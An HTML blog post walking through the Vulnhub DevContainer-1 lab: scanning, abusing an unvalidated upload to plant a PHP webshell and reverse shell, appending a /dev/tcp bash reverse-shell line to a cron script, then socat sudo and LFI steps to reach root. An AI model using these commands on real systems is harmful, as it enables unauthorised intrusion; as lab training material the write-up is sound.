@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>crazyeights225</title>
+   
+    <link rel="stylesheet" href="../assets/bulma.min.css">
+    <link rel="stylesheet" href="../static/default.min.css"><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.4.0/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();</script>
+    <style>
+      span{margin: 0; line-height: 125%; white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;}pre{padding:0.5rem 0.5rem!important;}
+    </style>
+  </head>
+  <body>
+    <div id="app" class="mt-2">
+        <nav class="navbar container" role="navigation" aria-label="main navigation">
+            <div class="navbar-brand">
+              <a class="navbar-item" href="/">
+                <img src="../assets/logo.png">
+              </a>
+              <a role="button" class="navbar-burger burger" aria-label="menu" aria-expanded="false" data-target="navbarBasicExample">
+                <span aria-hidden="true"></span>
+                <span aria-hidden="true"></span>
+                <span aria-hidden="true"></span>
+              </a>
+            </div>
+            <div id="navbar" class="navbar-menu">
+              <div class="navbar-start">
+                <a href="../index.html" class="navbar-item">Posts</a>
+                    <a href="../projects.html" class="navbar-item">Projects</a>
+              </div>
+            </div>
+          </nav>
+    </div>
+    <div class="hero-body mt-2" style="background-color: #285aff;">
+        <div class="container has-text-centered">
+            <h1 class="title" style="color: #f1f1f1;">
+                Vulnhub: DevContainer-1
+            </h1>
+            <h2 class="subtitle" style="color: #f1f1f1;">
+                Oct, 2020
+            </h2>
+        </div>
+    </div>
+</section>
+<section class="container mt-2">
+<div class="content column is-10">
+    <nav class="breadcrumb mb-5" aria-label="breadcrumbs">
+        <ul>
+          <li><a href="../index.html">Posts</a></li>
+          <li><a href="../sec.html">CTFs and Vulnerable VMs</a></li>
+          <li class="is-active"><a href="#" aria-current="page">Devcontainer-1</a></li>
+        </ul>
+      </nav>
+<h3>Scanning:</h3>
+<pre><code><span>Nmap scan report for 192.168.56.123
+Host is up (0.00017s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE
+80/tcp open  http
+</span></code></pre>
+<h4>More Scanning:</h4>
+<pre><code><span>crazyeights@es-base:~$ nmap -A -p- 192.168.56.123
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-24 13:03 EDT
+Nmap scan report for 192.168.56.123
+Host is up (0.000096s latency).
+Not shown: 65534 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Freelancer - Start Bootstrap Theme
+</span></code></pre>
+<h3>Web</h3>
+<img src="images/dc1.png" style="width:90%">
+<h3>Web Enum:</h3>
+<pre><code><span>crazyeights@es-base:~$ dirb http://192.168.56.123
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sat Oct 24 13:04:52 2020
+URL_BASE: http://192.168.56.123/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://192.168.56.123/ ----
+==&gt; DIRECTORY: http://192.168.56.123/css/                                      
+==&gt; DIRECTORY: http://192.168.56.123/fonts/                                    
+==&gt; DIRECTORY: http://192.168.56.123/img/                                      
++ http://192.168.56.123/index.html (CODE:200|SIZE:27263)                       
+==&gt; DIRECTORY: http://192.168.56.123/js/                                       
++ http://192.168.56.123/license (CODE:200|SIZE:11336)                          
+==&gt; DIRECTORY: http://192.168.56.123/mail/                                     
++ http://192.168.56.123/server-status (CODE:403|SIZE:279)                      
+==&gt; DIRECTORY: http://192.168.56.123/upload/                                   
+[SNIP]                                                                               
+---- Entering directory: http://192.168.56.123/upload/files/ ----
+                                                                               
+-----------------
+END_TIME: Sat Oct 24 13:05:02 2020
+DOWNLOADED: 41508 - FOUND: 4
+crazyeights@es-base:~$ 
+</span></code></pre>
+<h3>File Upload Dir:</h3>
+<img src="images/dc2.png" style="width:90%">
+<ul>
+<li>Doesn't look like they every did file extension validation:</li>
+</ul>
+<pre><code><span>&lt;title&gt;In construction&lt;/title&gt;
+Allowed file types: jpg,gif,png,zip,txt,xls,doc
+&lt;!--I need to validate file extensions--&gt;
+</span></code></pre>
+<h3>Testing the upload functionality:</h3>
+<ul>
+<li>To find the directory where the file gets uploaded to</li>
+<img src="images/dc3.png" style="width:90%">
+</ul>
+<p>File gets uploaded to:</p>
+<pre><code><span>http://192.168.56.123/upload/files/playing-card-icon-png-favpng-4y5r4Fw9K8A5vPjnaZyCfKsGN.jpg
+</span></code></pre>
+<p>Testing uploading a php file:</p>
+<ul>
+<li>Using a webshell, because I am curious if it will work.</li>
+</ul>
+<pre><code><span>http://192.168.56.123/upload/files/caf7e7bf96a799f0547469cb698bfb68.php
+</span></code></pre>
+<h3>Neat:</h3>
+<img src="images/dc4.png" style="width:90%">
+<h3>Now for proper reverse shell:</h3>
+<ul>
+<li>Using pentest monkey php reverse shell</li>
+<li>Start listener:</li>
+</ul>
+<pre><code><span>crazyeights@es-base:~$ nc -lvp 1234
+listening on [any] 1234 ...
+</span></code></pre>
+<img src="images/dc5.png" style="width:90%">
+<ul>
+<li>www-data shell:</li>
+</ul>
+<pre><code><span>connect to [192.168.56.1] from (UNKNOWN) [192.168.56.123] 37218
+Linux 06502074cfda 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux
+ 17:13:03 up 11 min,  0 users,  load average: 0.04, 0.13, 0.13
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ 
+</span></code></pre>
+<h5>In Maintenance-Web-Docker in www/html:</h5>
+<pre><code><span>130351 -rwxrwxrwx  1 root root  164 Sep 13 04:23 list.sh
+130349 -rwxr-xr-x  1 root root  204 Sep 12 21:31 maintenance.sh
+130341 -rw-r--r--  1 1000 1000  442 Oct 24 17:15 out.txt
+</span></code></pre>
+<pre><code><span>$ cat list.sh
+#!/bin/bash
+date &gt;&gt; /home/richard/web/Maintenance-Web-Docker/out.txt
+ls /home/richard/web/upload/files/ | wc -l &gt;&gt; /home/richard/web/Maintenance-Web-Docker/out.txt
+</span></code></pre>
+<p>The script is being run every minute:</p>
+<pre><code><span>$ cat out.txt
+[SNIP]
+Sat 24 Oct 2020 01:13:01 PM EDT
+2
+Sat 24 Oct 2020 01:14:01 PM EDT
+3
+</span></code></pre>
+<h5>Trying to use the list script to get elevated privileges:</h5>
+<ul>
+<li>Start a listener:</li>
+</ul>
+<pre><code><span>nc -lvp 9999
+</span></code></pre>
+<pre><code><span>$ echo &quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.56.1/9999 0&gt;&amp;1&quot; &gt;&gt; list.sh
+</span></code></pre>
+<h3>Getting richard (user):</h3>
+<pre><code><span>crazyeights@es-base:~$ nc -lvp 9999
+listening on [any] 9999 ...
+192.168.56.123: inverse host lookup failed: Unknown host
+connect to [192.168.56.1] from (UNKNOWN) [192.168.56.123] 45626
+bash: cannot set terminal process group (1166): Inappropriate ioctl for device
+bash: no job control in this shell
+richard@EC2:~$ ls
+ls
+HackTools
+user.txt
+web
+richard@EC2:~$ cat user.txt
+cat user.txt
+3a6b99f59ea363803bcafc7f5dd9b1e8
+richard@EC2:~$ 
+</span></code></pre>
+<h4>Checking out web:</h4>
+<p>There is a copy(?) of the site in www/html:</p>
+<pre><code><span>richard@EC2:~$ cd web
+cd web
+richard@EC2:~/web$ ls
+ls
+css
+font-awesome
+fonts
+img
+index.html
+js
+less
+license
+mail
+Maintenance-Web-Docker
+readme.md
+upload
+</span></code></pre>
+<h4>Checking out HackTools:</h4>
+<pre><code><span>richard@EC2:~$ cd HackTools	
+cd HackTools
+richard@EC2:~/HackTools$ ls
+ls
+README.txt
+socat
+richard@EC2:~/HackTools$ cat README.txt
+cat README.txt
+Richard, it's annoying to lose bash, try:
+( sudo socat [...] ) &amp;
+</span></code></pre>
+<p>As soon as I read <code>Richard, it's annoying to lose bash,</code>, i was like ohh noo what if I lose bash and have to start over...</p>
+<h4>Checking if richard can run socat as root</h4>
+<pre><code><span>richard@EC2:~/HackTools$ sudo -l
+sudo -l
+Matching Defaults entries for richard on EC2:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User richard may run the following commands on EC2:
+    (ALL) NOPASSWD: /home/richard/HackTools/socat TCP-LISTEN\:8080\,fork
+        TCP\:127.0.0.1\:90
+</span></code></pre>
+<h4>Trying to run the command as user root:</h4>
+<pre><code><span>richard@EC2:~/HackTools$ sudo -u root /home/richard/HackTools/socat TCP-LISTEN\:8080\,fork TCP\:127.0.0.1\:90
+</span></code></pre>
+<h4>You can now access the development site at localhost:8080:</h4>
+<img src="images/dc6.png" style="width:90%">
+<h5>Looks like LFI:</h5>
+<pre><code><span>http://192.168.56.123:8080/index.php?view=about-us.html
+</span></code></pre>
+<h3>Let's see if I can find my nifty webshell to reuse:</h3>
+<ul>
+<li>Since the maintenance script copies all uploads to richards web folder, reuse my shell with this process which is running as root.</li>
+</ul>
+<pre><code><span>http://192.168.56.123:8080/index.php?view=../../../../../../../../../home/richard/web/upload/files/caf7e7bf96a799f0547469cb698bfb68.php
+</span></code></pre>
+<h3>Neat:</h3>
+<img src="images/dc7.png" style="width:90%">
+<h5>Checking /root:</h5>
+<img src="images/dc8.png" style="width:90%">
+<h5>Getting root flag:</h5>
+<img src="images/dc9.png" style="width:90%">
+<pre><code><span> _    _      _ _       _                  _ 
+| |  | |    | | |     | |                | |
+| |  | | ___| | |   __| | ___  _ __   ___| |
+| |/\| |/ _ \ | |  / _` |/ _ \| '_ \ / _ \ |
+\  /\  /  __/ | | | (_| | (_) | | | |  __/_|
+ \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___(_)
+                                            
+07f61ca07bc617f9639b412423b2cc6f
+Twitter: @0x04E1
+</span></code></pre>
+<p>FIN.</p>
+</div>
+</section>
+<footer class="footer">
+    <div class="container">
+        <div class="columns">
+        </div>
+    </div>
+</footer>
+</body>
+</html>
